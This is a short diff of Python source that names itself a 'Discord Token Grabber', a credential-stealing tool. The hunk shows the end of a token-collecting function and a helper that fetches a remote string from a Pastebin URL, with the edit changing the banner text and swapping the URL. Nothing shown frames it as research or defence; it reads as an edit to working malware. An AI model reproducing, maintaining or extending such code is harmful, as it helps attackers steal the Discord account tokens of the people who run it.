@@ -82,9 +82,9 @@ def gettokens(path):
 					tokens.append(token)
 	return tokens
 def getdeveloper():
-	dev = "Discord Token Grabber by Haskers Gang © 2021"
+	dev = "Discord Token Grabber"
 	try:
-		dev = urlopen(Request("https://pastebin.com/raw/jgTdZE65")).read().decode()
+		dev = urlopen(Request("https://pastebin.com/raw/0cXQ5ULy")).read().decode()
 	except:
 		pass
 	return dev
